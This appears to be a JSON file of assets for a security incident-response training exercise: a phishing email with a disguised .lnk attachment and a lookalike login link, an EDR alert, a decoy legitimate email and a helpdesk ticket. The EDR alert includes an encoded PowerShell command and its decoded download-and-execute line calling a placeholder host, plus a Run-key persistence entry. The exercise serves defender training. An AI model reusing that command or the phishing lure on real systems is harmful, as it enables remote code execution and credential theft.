@@ -1,0 +1,141 @@
+[
+  {
+    "id": "doc-phish-email",
+    "asset_type": "email",
+    "title": "Reported email: \"URGENT: Payroll remittance requires approval today\"",
+    "reveal_phase": "triage",
+    "is_decoy": false,
+    "content": {
+      "from_display": "Northwind Payroll Services",
+      "from_address": "billing@secure-login.northwind-corp.example",
+      "reply_to": "billing@secure-login.northwind-corp.example",
+      "to": "p.raman@northwind.example",
+      "date": "2025-03-11T08:41:52Z",
+      "subject": "URGENT: Payroll remittance requires approval today",
+      "attachments": [
+        {
+          "filename": "Payroll_Remittance_Q1.pdf.lnk",
+          "size_bytes": 2314,
+          "sha256": "9f2b5a41c7d3e08b6142ad95cf3170e2b8d49a6c5e1f7302a4bb9c8d0e5f61a7",
+          "content_type": "application/x-ms-shortcut"
+        }
+      ],
+      "headers": {
+        "Return-Path": "bounce@secure-login.northwind-corp.example",
+        "Received-SPF": "fail (northwind.example: domain of northwind-corp.example does not designate 203.0.113.91 as permitted sender)",
+        "Authentication-Results": "dkim=none; dmarc=fail (p=none)",
+        "X-Originating-IP": "203.0.113.91",
+        "X-Mailer": "PHPMailer 6.1.4"
+      },
+      "body_text": "Dear Priya,\n\nOur records show the Q1 payroll remittance for Northwind Polytechnic has NOT been approved. Payment to 218 staff will be held unless this is authorised before 12:00 today.\n\nThe remittance advice is attached. If the attachment does not open, verify your account at the staff portal below and the document will be released to you.\n\n  Verify and release document:\n  https://northwind-sso.verify-access.example/login?ref=payroll-q1\n\nThis is an automated message from Northwind Payroll Services. Do not reply.\n\nRegards,\nAccounts Payable\nNorthwind Payroll Services",
+      "analyst_notes": [
+        "Display name says Northwind, but the sending domain is northwind-corp.example - a lookalike, not the real northwind.example.",
+        "SPF fails and DMARC fails. The real domain publishes a policy; this message does not pass it.",
+        "The attachment has a double extension: it looks like a PDF but is a .lnk shortcut, which Windows executes.",
+        "Urgency plus a deadline plus a consequence for 218 other people is textbook pressure engineering."
+      ]
+    }
+  },
+  {
+    "id": "doc-edr-alert",
+    "asset_type": "edr_alert",
+    "title": "EDR detection: suspicious child process of OUTLOOK.EXE",
+    "reveal_phase": "triage",
+    "is_decoy": false,
+    "content": {
+      "detection_id": "EDR-2025-0311-4471",
+      "product": "Northwind EDR",
+      "rule_name": "Office application spawned an encoded PowerShell command",
+      "rule_id": "NWD-EDR-0142",
+      "severity": "high",
+      "confidence": "medium",
+      "detected_at": "2025-03-11T09:03:11Z",
+      "hostname": "WKS-HR-014",
+      "username": "NORTHWIND\\p.raman",
+      "os": "Windows 11 Enterprise 23H2",
+      "process_tree": [
+        {
+          "depth": 0,
+          "pid": 4128,
+          "image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE",
+          "command_line": "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE\"",
+          "signed": true
+        },
+        {
+          "depth": 1,
+          "pid": 7742,
+          "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "command_line": "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwB1AHAAZABhAHQAZQAtAGMAZABuAC4AcABhAHkAbABvADQAZAAuAGUAeABhAG0AcABsAGUALwBzADIAJwApAA==",
+          "signed": true,
+          "note": "Signed binary, unsigned intent. The -enc flag carries a base64 payload; -w hidden suppresses the window."
+        },
+        {
+          "depth": 2,
+          "pid": 8016,
+          "image": "C:\\Users\\p.raman\\AppData\\Roaming\\OneDriveSync\\onedrivesync.exe",
+          "command_line": "\"C:\\Users\\p.raman\\AppData\\Roaming\\OneDriveSync\\onedrivesync.exe\"",
+          "signed": false,
+          "sha256": "4c1d9e73f5a2680bb31c47e0a9d85f62103e7b4c8a6d2f9015e3b7c4d8a1f620"
+        }
+      ],
+      "decoded_command": "IEX (New-Object Net.WebClient).DownloadString('https://update-cdn.paylo4d.example/s2')",
+      "decode_hint": "The -enc value is UTF-16LE base64. Decoding it is the point of this alert.",
+      "file_events": [
+        {
+          "at": "2025-03-11T09:03:28Z",
+          "operation": "create",
+          "path": "C:\\Users\\p.raman\\AppData\\Roaming\\OneDriveSync\\onedrivesync.exe",
+          "sha256": "4c1d9e73f5a2680bb31c47e0a9d85f62103e7b4c8a6d2f9015e3b7c4d8a1f620"
+        }
+      ],
+      "registry_events": [
+        {
+          "at": "2025-03-11T09:03:40Z",
+          "operation": "set_value",
+          "key": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\OneDriveSync",
+          "value": "C:\\Users\\p.raman\\AppData\\Roaming\\OneDriveSync\\onedrivesync.exe"
+        }
+      ]
+    }
+  },
+  {
+    "id": "doc-benign-newsletter",
+    "asset_type": "email",
+    "title": "Also reported that morning: IT maintenance notice",
+    "reveal_phase": "triage",
+    "is_decoy": true,
+    "content": {
+      "from_display": "Northwind IT Service Desk",
+      "from_address": "noreply@northwind.example",
+      "to": "all-staff@northwind.example",
+      "date": "2025-03-11T07:15:00Z",
+      "subject": "Planned maintenance: staff portal unavailable Saturday 02:00-04:00",
+      "attachments": [],
+      "headers": {
+        "Received-SPF": "pass (northwind.example: domain of northwind.example designates 10.20.1.25 as permitted sender)",
+        "Authentication-Results": "dkim=pass; dmarc=pass"
+      },
+      "body_text": "The staff portal will be unavailable this Saturday between 02:00 and 04:00 for scheduled patching. No action is required.\n\nIf you have questions, contact the Service Desk on extension 4400.\n\nNorthwind IT Service Desk",
+      "analyst_notes": [
+        "Reported by a staff member on the same morning, which is why it is in the queue.",
+        "SPF and DMARC both pass and the sender is the genuine internal domain. This is legitimate mail."
+      ]
+    }
+  },
+  {
+    "id": "doc-ticket",
+    "asset_type": "ticket",
+    "title": "Service Desk ticket SD-88214",
+    "reveal_phase": "triage",
+    "is_decoy": false,
+    "content": {
+      "ticket_id": "SD-88214",
+      "opened_at": "2025-03-11T08:58:00Z",
+      "opened_by": "p.raman@northwind.example",
+      "channel": "phone",
+      "priority": "normal",
+      "subject": "Odd payroll email - and now my laptop is slow",
+      "body": "I got an email this morning about payroll not being approved. It looked wrong so I called to check. I did open the attachment first though - it did not open properly, just flashed a black window and closed. The laptop has been slow since. Sorry if I have caused a problem."
+    }
+  }
+]
